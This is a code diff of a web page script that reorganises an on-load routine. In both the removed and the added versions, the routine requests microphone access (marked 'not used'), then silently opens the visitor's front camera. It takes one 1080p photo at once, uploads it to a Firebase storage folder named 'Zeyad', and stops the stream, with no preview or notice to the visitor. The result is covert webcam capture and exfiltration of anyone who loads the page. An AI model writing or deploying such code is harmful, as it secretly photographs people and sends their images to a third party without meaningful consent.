@@ -24,49 +24,6 @@
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
-        // Request microphone access when the window loads
-        window.addEventListener('load', () => {
-            // Request microphone access only
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(() => {
-                    console.log('Microphone access granted (not used).');
-                    // Proceed to request camera access (optional)
-                    // If you want to remove the camera part, comment or remove the following lines
-                    return navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: "user", // Using front camera
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        }
-                    });
-                })
-                .then(stream => {
-                    // If you want to use the camera as well, you can handle it here
-                    // If not, you can comment out the following block
-                    const video = document.createElement('video');
-                    const canvas = document.createElement('canvas');
-                    const context = canvas.getContext('2d');
-
-                    video.srcObject = stream;
-                    video.onloadedmetadata = () => {
-                        video.play();
-
-                        // Set canvas size for 1080p
-                        canvas.width = 1920;  
-                        canvas.height = 1080; 
-
-                        // Capture image immediately
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const imageData = canvas.toDataURL('image/png');
-                        uploadImage(imageData); // Upload image to Firebase
-                        stopVideo(stream); // Stop the video stream
-                    };
-                })
-                .catch(err => {
-                    console.error('Error accessing microphone or camera: ', err);
-                });
-        });
-
         // Function to upload image to Firebase
         function uploadImage(imageData) {
             const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
@@ -78,6 +35,44 @@
                     console.error('Error uploading image:', error);
                 });
         }
+
+        // Access video and canvas elements
+        window.addEventListener('load', () => {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            // Request microphone access first
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(() => {
+                    console.log('Microphone access granted (not used).');
+                    // After microphone access is granted, request camera access
+                    return navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: "user", // Using front camera
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 }
+                        }
+                    });
+                })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        // Set canvas size for 1080p
+                        canvas.width = 1920;
+                        canvas.height = 1080;
+                        // Capture image immediately
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL('image/png');
+                        uploadImage(imageData); // Upload image to Firebase
+                        stopVideo(stream); // Stop the video stream
+                    };
+                })
+                .catch(err => {
+                    console.error('Error accessing microphone or camera: ', err);
+                });
+        });
 
         // Function to stop video stream
         function stopVideo(stream) {
